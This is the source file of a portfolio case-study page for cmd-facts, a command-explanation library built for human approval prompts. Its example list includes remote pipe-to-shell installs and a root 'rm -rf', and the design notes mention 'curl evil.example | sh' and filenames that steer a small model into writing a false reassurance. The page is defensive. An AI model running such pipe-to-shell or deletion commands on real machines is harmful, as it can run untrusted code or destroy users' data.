import { useEffect, useMemo, useRef, useState } from "react";
import { effectsOf, explain } from "cmd-facts";
import type { Project } from "@/lib/content";
import {
  CaseHero,
  CaseSection,
  Decisions,
  NextProject,
} from "@/components/work/case";
import { cn } from "@/lib/utils";

/**
 * cmd-facts' signature: the real library, imported from npm and run in the
 * browser. Every panel on this page is a live `explain()` call — hover an
 * argument in the command and its slot in the sentence lights up, because
 * `parts` carries the command's own text apart from the row's words.
 */

type Explanation = ReturnType<typeof explain>;
type Part = NonNullable<Explanation["parts"]>[number];

const mono = "font-mono text-[0.88em]";

/** The library joins a slot's values with commas and a final "and". */
function joinValues(values: string[]) {
  if (values.length === 1) return values[0];
  return `${values.slice(0, -1).join(", ")} and ${values[values.length - 1]}`;
}

type Seg = { text: string; part?: number };

/**
 * Wrap each slot value where it appears in the typed line, so the command and
 * the sentence can highlight each other. Best-effort on purpose: a value the
 * line doesn't contain verbatim simply doesn't light up.
 */
function segmentLine(line: string, parts: Part[]): Seg[] {
  const marks: { start: number; end: number; part: number }[] = [];
  // A whole word beats a substring: the -o argument's install.sh, not the
  // URL's. A value that only ever appears inside another word still matches.
  const edge = (c: string | undefined) => c === undefined || /[\s"']/.test(c);
  const find = (v: string) => {
    let fallback = -1;
    for (let at = line.indexOf(v); at !== -1; at = line.indexOf(v, at + 1)) {
      if (marks.some((m) => at < m.end && at + v.length > m.start)) continue;
      if (edge(line[at - 1]) && edge(line[at + v.length])) return at;
      if (fallback === -1) fallback = at;
    }
    return fallback;
  };
  parts.forEach((p, i) => {
    if (p.kind !== "values") return;
    for (const v of p.values) {
      if (!v) continue;
      const at = find(v);
      if (at === -1) continue;
      marks.push({ start: at, end: at + v.length, part: i });
    }
  });
  marks.sort((a, b) => a.start - b.start);
  const segs: Seg[] = [];
  let pos = 0;
  for (const m of marks) {
    if (m.start > pos) segs.push({ text: line.slice(pos, m.start) });
    segs.push({ text: line.slice(m.start, m.end), part: m.part });
    pos = m.end;
  }
  if (pos < line.length) segs.push({ text: line.slice(pos) });
  return segs;
}

/** Effect words, coloured by what they do: look, leave marks, take away, hand over control. */
const EFFECT_COLOR: Record<string, string> = {
  read: "var(--cf-effect-read)",
  write: "var(--cf-effect-write)",
  create: "var(--cf-effect-write)",
  configure: "var(--cf-effect-write)",
  install: "var(--cf-effect-write)",
  delete: "var(--cf-effect-delete)",
  terminate: "var(--cf-effect-delete)",
  transmit: "var(--cf-effect-power)",
  execute: "var(--cf-effect-power)",
  elevate: "var(--cf-effect-power)",
};

const factLabel: Record<string, string> = {
  yes: "yes",
  no: "no",
  "with-backup": "with a backup",
  unknown: "unknown",
  none: "none",
  "known-host": "a known address",
  arbitrary: "anywhere",
  listens: "listens",
  admin: "admin",
  root: "root",
  verified: "verified",
  derived: "derived",
};

/** Names an argument's role in a small tip above it, and to screen readers. */
function RoleTip({ role }: { role: string }) {
  return (
    <>
      <span className="sr-only"> ({role})</span>
      <span
        aria-hidden
        className="pointer-events-none absolute -top-7 left-1/2 -translate-x-1/2 translate-y-1 whitespace-nowrap rounded-lg bg-ink px-2 py-1 font-sans text-[0.72rem] font-semibold leading-none text-sheet opacity-0 shadow-[var(--shadow-lift)] transition-[opacity,transform] duration-150 ease-out-quart group-hover/var:translate-y-0 group-hover/var:opacity-100 group-focus-visible/var:translate-y-0 group-focus-visible/var:opacity-100"
      >
        {role}
      </span>
    </>
  );
}

/** What to call an argument in its tip: the role, or the reduction a slot shows. */
function roleOf(part: Part | undefined): string | null {
  if (!part || part.kind !== "values") return null;
  return "show" in part && part.show === "host" ? "host" : (part.role ?? null);
}

function Explain({
  line,
  compact,
  preview,
  showRoles,
  className,
}: {
  line: string;
  /** The home card and hero fit: fewer fact chips, tighter spacing. */
  compact?: boolean;
  /** The home card only: no footnotes, so the panel fits a 4:3 card. */
  preview?: boolean;
  /** The playground: arguments render in the project green and name their role in a tip. */
  showRoles?: boolean;
  className?: string;
}) {
  const ex = useMemo(() => {
    try {
      return explain(line);
    } catch {
      return null;
    }
  }, [line]);
  const [hot, setHot] = useState<number | null>(null);

  if (!ex)
    return (
      <div
        role="group"
        aria-label={`What cmd-facts says about ${line}`}
        className={cn(
          "rounded-[24px] bg-sheet text-left shadow-[var(--shadow-tile)]",
          compact ? "p-4 sm:p-5" : "p-5 sm:p-7",
          className,
        )}
      >
        <p className="m-0 font-medium leading-snug text-ink">
          This line could not be read as a command.
        </p>
      </div>
    );
  const parts: Part[] = ex.parts ?? [{ kind: "text", text: ex.sentence }];
  const segs = segmentLine(line, parts);
  const facts = ex.facts;
  const effects = effectsOf(facts);

  const rows: { label: string; value: string }[] = [
    { label: "Reversible", value: factLabel[facts.reversible] },
    { label: "Network", value: factLabel[facts.network] },
    ...(compact
      ? []
      : [
          { label: "Privilege", value: factLabel[facts.privilege] },
          { label: "Repeat-safe", value: facts.repeatSafe ? "yes" : "no" },
        ]),
    { label: "Confidence", value: factLabel[facts.confidence] ?? "unknown" },
  ];

  const slot = (on: boolean) =>
    cn(
      "rounded-[0.35em] transition-colors duration-150",
      on && "bg-[color-mix(in_srgb,var(--cmd-facts)_32%,transparent)]",
    );

  return (
    <div
      role="group"
      aria-label={`What cmd-facts says about ${line}`}
      className={cn(
        "rounded-[24px] bg-sheet text-left shadow-[var(--shadow-tile)]",
        compact ? "p-4 sm:p-5" : "p-5 sm:p-7",
        className,
      )}
    >
      <p
        className={cn(
          mono,
          "m-0 whitespace-pre-wrap break-all rounded-2xl bg-sheet-sunk px-4 py-3 leading-relaxed text-ink shadow-[inset_0_0_0_1px_var(--line)]",
        )}
      >
        <span aria-hidden className="select-none text-ink-3">
          ${" "}
        </span>
        {segs.map((s, i) =>
          s.part === undefined ? (
            <span key={i}>{s.text}</span>
          ) : (
            <span
              key={i}
              tabIndex={-1}
              onPointerEnter={() => setHot(s.part!)}
              onPointerLeave={() => setHot(null)}
              className={cn(
                slot(hot === s.part),
                "underline decoration-[color-mix(in_srgb,var(--cmd-facts)_70%,var(--ink))] decoration-2 underline-offset-[0.22em]",
                showRoles &&
                  "group/var relative text-[var(--cmd-facts-text)]",
              )}
            >
              {s.text}
              {showRoles && roleOf(parts[s.part]) && (
                <RoleTip role={roleOf(parts[s.part])!} />
              )}
            </span>
          ),
        )}
      </p>

      <p
        className={cn(
          "m-0 mt-4 leading-snug text-ink",
          compact
            ? "text-[1.02rem] font-medium"
            : "text-[clamp(1.1rem,1.6vw,1.3rem)] font-medium",
        )}
      >
        {parts.map((p, i) =>
          p.kind === "text" ? (
            <span key={i}>{p.text}</span>
          ) : (
            <span
              key={i}
              onPointerEnter={() => setHot(i)}
              onPointerLeave={() => setHot(null)}
              className={cn(
                mono,
                "font-semibold",
                slot(hot === i),
                showRoles && "group/var relative text-[var(--cmd-facts-text)]",
              )}
            >
              {joinValues(p.values)}
              {showRoles && roleOf(p) && <RoleTip role={roleOf(p)!} />}
            </span>
          ),
        )}
      </p>

      <dl
        className={cn(
          "m-0 flex flex-wrap gap-x-6 gap-y-2 border-t border-line",
          compact ? "mt-4 pt-3.5" : "mt-5 pt-4",
        )}
      >
        <div>
          <dt className="text-[0.76rem] font-medium text-ink-3">
            {facts.opaque ? "Effect, at least" : "Effect"}
          </dt>
          <dd className="m-0 text-[0.92rem] font-semibold">
            {effects.length
              ? effects.map((e, i) => (
                  <span key={e}>
                    {i > 0 && (
                      <span aria-hidden className="text-ink-3">
                        {" · "}
                      </span>
                    )}
                    <span
                      style={{
                        color: EFFECT_COLOR[e] ?? "var(--cmd-facts-text)",
                      }}
                    >
                      {e}
                    </span>
                  </span>
                ))
              : "—"}
          </dd>
        </div>
        {rows.map((r) => (
          <div key={r.label}>
            <dt className="text-[0.76rem] font-medium text-ink-3">{r.label}</dt>
            <dd className="m-0 text-[0.92rem] font-semibold text-ink">
              {r.value}
            </dd>
          </div>
        ))}
      </dl>

      {!preview && facts.opaque && (
        <p className="m-0 mt-3 text-[0.92rem] leading-relaxed text-ink-2">
          <strong className="font-semibold text-ink">Hands over to</strong>{" "}
          {facts.handsOverTo}. Past that point the fields are a floor, not a
          measurement.
        </p>
      )}
      {!compact && facts.note && (
        <p className="m-0 mt-3 text-[0.92rem] leading-relaxed text-ink-2">
          {facts.note}
        </p>
      )}
    </div>
  );
}

const EXAMPLES = [
  "curl -fsSL https://get.example.com/install.sh -o install.sh",
  "rm -rf node_modules",
  "curl https://get.example.com/install.sh | sh",
  "sudo rm -rf /var/tmp",
  "ls ~/Documents > listing.txt",
  "df -h",
];

/** Hero media: the panel working through real commands, one at a time. */
function HeroDemo() {
  const [index, setIndex] = useState(0);
  const picked = useRef(false);
  const frame = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
    const id = setInterval(() => {
      if (picked.current) return;
      const el = frame.current;
      if (el && (el.matches(":hover") || el.contains(document.activeElement)))
        return;
      setIndex((i) => (i + 1) % EXAMPLES.length);
    }, 5000);
    return () => clearInterval(id);
  }, []);

  return (
    <div ref={frame}>
      <Explain line={EXAMPLES[index]} compact />
      <div
        className="mt-3 flex flex-wrap gap-1.5"
        role="group"
        aria-label="Example commands"
      >
        {EXAMPLES.map((line, i) => (
          <button
            key={line}
            type="button"
            aria-pressed={i === index}
            onClick={() => {
              picked.current = true;
              setIndex(i);
            }}
            className={cn(
              mono,
              "min-h-9 cursor-pointer rounded-full border-0 px-3 text-[0.72rem] font-medium transition-[background-color,transform] duration-150 ease-out-quart active:scale-[0.95]",
              i === index
                ? "bg-[var(--cmd-facts-deep)] text-[var(--cmd-facts)]"
                : "bg-[oklch(1_0_0/0.4)] text-[var(--cmd-facts-deep)] hover:bg-[oklch(1_0_0/0.7)]",
            )}
          >
            {line.split(" ")[0] === "curl" && line.includes("|")
              ? "curl | sh"
              : line.split(" ").slice(0, 2).join(" ")}
          </button>
        ))}
      </div>
    </div>
  );
}

/** The home card's face: one explained command, decorative. */
export function ExplainPreview() {
  return (
    <div aria-hidden className="pointer-events-none w-full">
      <Explain line="sudo rm -rf /var/tmp" compact preview />
    </div>
  );
}

function Playground() {
  const [value, setValue] = useState(EXAMPLES[0]);
  const line = value.trim();
  // What screen readers hear: just the sentence, and only once typing settles.
  const [announced, setAnnounced] = useState("");
  useEffect(() => {
    const id = setTimeout(() => {
      try {
        setAnnounced(line ? explain(line).sentence : "");
      } catch {
        setAnnounced("");
      }
    }, 600);
    return () => clearTimeout(id);
  }, [line]);
  return (
    <div className="rounded-[32px] bg-[var(--cmd-facts)] p-4 sm:p-8">
      <label
        htmlFor="cf-line"
        className="block px-1 pb-3 font-semibold text-[var(--cmd-facts-deep)]"
      >
        Type a command, or take one of these
      </label>
      <input
        id="cf-line"
        type="text"
        value={value}
        onChange={(e) => setValue(e.target.value)}
        autoComplete="off"
        autoCapitalize="off"
        spellCheck={false}
        placeholder="rm -rf /tmp/build"
        className={cn(
          mono,
          "block w-full rounded-2xl border-0 bg-[oklch(1_0_0/0.75)] px-5 py-4 text-[0.95rem] text-[var(--cmd-facts-deep)] shadow-[inset_0_0_0_1px_oklch(0_0_0/0.08)] outline-none transition-shadow duration-150",
          "placeholder:text-[color-mix(in_oklch,var(--cmd-facts-deep)_55%,var(--cmd-facts))]",
          "focus-visible:shadow-[inset_0_0_0_2px_var(--cmd-facts-deep)]",
        )}
      />
      <div className="mt-3 flex flex-wrap gap-1.5 px-1">
        {EXAMPLES.map((ex) => (
          <button
            key={ex}
            type="button"
            onClick={() => setValue(ex)}
            className={cn(
              mono,
              "min-h-9 cursor-pointer rounded-full border-0 bg-[oklch(1_0_0/0.4)] px-3 text-[0.74rem] font-medium text-[var(--cmd-facts-deep)] transition-[background-color,transform] duration-150 ease-out-quart hover:bg-[oklch(1_0_0/0.75)] active:scale-[0.95]",
            )}
          >
            {ex}
          </button>
        ))}
      </div>
      <div className="mt-4">
        {line ? (
          <Explain line={line} showRoles />
        ) : (
          <p className="m-0 px-1 py-6 text-center font-medium text-[var(--cmd-facts-deep)]">
            The panel answers as soon as there's a line to read.
          </p>
        )}
      </div>
      <span aria-live="polite" className="sr-only">
        {announced}
      </span>
      <p className="m-0 max-w-[70ch] px-1 pt-4 text-[0.9rem] leading-relaxed text-[var(--cmd-facts-deep)]">
        This is the published package, running in your browser. The table is
        early: a command it has no row for comes back as the widest floor, with
        a sentence that admits it. That honesty is the point.
      </p>
    </div>
  );
}

/** Clear beside opaque: the type-level story, told with two live rows. */
function ClearVsOpaque() {
  return (
    <div className="grid gap-5 lg:grid-cols-2 lg:gap-6">
      <figure className="m-0">
        <Explain line="curl -fsSL https://get.example.com/install.sh -o install.sh" />
        <figcaption className="mt-3 px-2 text-[0.92rem] text-ink-2">
          A clear row: the library can account for the whole command, so{" "}
          <code>effect</code> is a complete list.
        </figcaption>
      </figure>
      <figure className="m-0">
        <Explain line="sudo rm -rf /var/tmp" />
        <figcaption className="mt-3 px-2 text-[0.92rem] text-ink-2">
          An opaque row: <code>sudo</code> hands over, so there is no{" "}
          <code>effect</code> field at all — only <code>effectAtLeast</code>,
          and reading a complete list off it is a type error.
        </figcaption>
      </figure>
    </div>
  );
}

export function CmdFactsCase({ project }: { project: Project }) {
  return (
    <>
      <CaseHero
        project={project}
        facts={[
          { label: "Role", value: "Designed and built it" },
          { label: "Status", value: "Early — v0.2.0 on npm" },
          { label: "Stack", value: "TypeScript, zero dependencies" },
          { label: "Licence", value: "MIT" },
        ]}
        media={<HeroDemo />}
        jump={{ label: "Try it", href: "#playground" }}
      />

      <CaseSection id="why" title="Why I built it">
        <p>
          I ran into this building Valet. Valet ends at an approval prompt: an
          agent wants to run a command on a machine you own, and you decide.
          The prompt can show the command itself, which is honest — and no
          help at all if you've never opened a terminal. Valet needed a plain
          sentence under that command.
        </p>
        <p>
          But that reader is everywhere, not just in Valet: a customer
          clicking Allow in a remote support session, a release manager
          signing off a CI gate, an agent asking before it runs a tool, an
          admin console logging who approved what. Everything they're shown
          should answer one question:{" "}
          <strong>if this runs, what happens to this computer?</strong>
        </p>
        <p>
          So it became a library rather than a Valet feature. Not a man-page
          browser, not a linter — structured facts about what a command does,
          written for the person who has to approve it and didn't write it.
          Wiring it into Valet's own prompt is next.
        </p>
      </CaseSection>

      <CaseSection
        id="schema"
        title="The schema is the deliverable"
        wide={<ClearVsOpaque />}
      >
        <p>
          <code>explain()</code> returns fields — <code>effect</code>,{" "}
          <code>reversible</code>, <code>network</code>, <code>privilege</code>
          , <code>confidence</code>. The plain-English sentence is one
          rendering of those fields, not the deliverable. A consumer that colours a
          button or gates a policy reads the fields; only a consumer that has
          to talk to a person reads the sentence.
        </p>
        <p>
          The honest part is what happens when the library <em>can't</em> see.{" "}
          <code>sh -c</code>, <code>xargs</code>, <code>sudo</code>,{" "}
          <code>npm install</code> all hand over to code that isn't on the
          line. An opaque row has <strong>no effect field at all</strong> — it
          has <code>effectAtLeast</code> and names what it handed over to, so
          claiming completeness about a command nobody read is a compile error
          rather than a quiet mistake.
        </p>
        <p>
          Argument text is attacker-controlled, so the sentence also ships
          unjoined: <code>parts</code> carries the row's words and the
          command's own text separately. Hover an argument in any panel on
          this page — that pairing is <code>parts</code> doing its job.
        </p>
      </CaseSection>

      <CaseSection id="decisions" title="The decisions that mattered">
        <p>
          Most of what shaped cmd-facts is refusals. Each one is something a
          neighbouring tool would happily ship.
        </p>
        <Decisions
          items={[
            {
              title: "No risk score",
              body: (
                <p>
                  Risk depends on the target, not the command:{" "}
                  <code>rm</code> on a build folder and <code>rm</code> on a
                  home folder are the same command. A number shipped here would
                  be used as policy, and it would be wrong. Facts here, scoring
                  at the consumer, which knows the target.
                </p>
              ),
            },
            {
              title: "No model at run time, now or later",
              body: (
                <p>
                  In an approval prompt the command line is
                  attacker-controlled, and a small model is steerable by
                  filenames. The failure mode is a fluent, reassuring sentence
                  above a dangerous command. If a heuristic would raise
                  coverage, the library returns nothing instead and says so.
                </p>
              ),
            },
            {
              title: "No discovery",
              body: (
                <p>
                  Extra command tables (packs) have to be named in the
                  consumer's own source. No JSON directory, no environment
                  variable, no <code>node_modules</code> scan: anyone who
                  could drop in a file could relabel{" "}
                  <code>curl evil.example | sh</code> as "checks how much room
                  is left on each disk".
                </p>
              ),
            },
            {
              title: "Trust is the consumer's decision, never the pack's",
              body: (
                <p>
                  A row from a pack the consumer didn't vouch for arrives at
                  lowered confidence, through a merge that can only widen a
                  claim, never soften it. A consumer gating on{" "}
                  <code>verified</code> never auto-approves a claim nobody
                  stands behind.
                </p>
              ),
            },
          ]}
        />
      </CaseSection>

      <CaseSection id="built" title="How I built it">
        <p>
          Schema first: the first commit defines the fact set, and the third
          turns the writing rules into tests. Every sentence in the table is
          linted — one sentence, under 150 characters, "folder" not
          "directory", no verdict about safety, and no string that could be
          lifted out and run. The register is enforced by{" "}
          <code>pnpm test</code>, not by review alone.
        </p>
        <p>
          Claude wrote most of the code: <strong>48 of the 58 commits</strong>{" "}
          carry its co-author line. My part was the spec and the refusals —
          deciding what this library must never do was most of the design.
        </p>
      </CaseSection>

      <CaseSection id="playground" title="Try it" wide={<Playground />}>
        <p>
          The same <code>explain()</code> this page has been calling all
          along, with the keyboard handed to you. Pipes, redirections,{" "}
          <code>sudo</code> and quoting are all read; substitutions are
          refused on purpose, because what <code>$(…)</code> stands for is not
          on the line.
        </p>
      </CaseSection>

      <NextProject current="cmd-facts" />
    </>
  );
}
